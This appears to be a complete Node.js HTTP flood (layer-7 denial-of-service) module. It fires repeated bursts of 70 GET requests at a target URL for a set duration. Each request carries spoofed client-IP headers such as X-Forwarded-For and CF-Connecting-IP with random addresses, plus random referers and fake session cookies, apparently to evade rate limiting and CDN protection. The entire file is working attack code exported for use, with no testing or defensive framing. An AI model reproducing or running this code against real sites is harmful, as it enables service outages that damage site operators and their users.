const https = require("https");
const http = require("http");
const { URL } = require("url");

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function buildHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer": `https://${hostname}/?r=${Math.random().toString(36)}`,
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}`
  };
}

function sendRequest(target, headers, onResponse, visited = new Set()) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;

  const options = {
    method: "GET",
    hostname: url.hostname,
    path: url.pathname + url.search || "/",
    port: url.port || (url.protocol === "https:" ? 443 : 80),
    headers
  };

  const req = client.request(options, res => {
    console.log(`[${res.statusCode}] ${url.href}`);

    // Handle 301 or 302 redirects
    if ((res.statusCode === 301 || res.statusCode === 302) && res.headers.location) {
      const redirectTo = new URL(res.headers.location, url).toString();
      if (!visited.has(redirectTo)) {
        visited.add(redirectTo);
        sendRequest(redirectTo, headers, onResponse, visited); // follow once
      }
    }

    res.on("data", () => {});
    onResponse();
  });

  req.on("error", onResponse);
  req.end();
}

module.exports = function (target, duration) {
  const end = Date.now() + duration * 1000;

  function loop() {
    if (Date.now() >= end) return;

    for (let i = 0; i < 70; i++) {
      sendRequest(target, buildHeaders(new URL(target).hostname), () => {});
    }

    setTimeout(loop, Math.floor(Math.random() * 150) + 100);
  }

  loop();
};
